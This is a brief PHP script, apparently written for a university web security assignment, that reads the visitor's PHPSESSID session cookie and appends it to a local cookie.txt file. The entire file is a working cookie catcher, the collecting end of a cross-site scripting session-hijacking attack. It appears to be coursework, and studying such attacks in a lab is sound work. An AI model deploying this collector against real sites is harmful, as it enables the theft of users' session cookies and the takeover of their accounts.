<?php
$cookie = $_COOKIE['PHPSESSID'];
$file = fopen('C:\Users\Bfkth\Dropbox\Bureaublad\Informatica\Kwartiel 4\Web Security\Assignment 4\cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
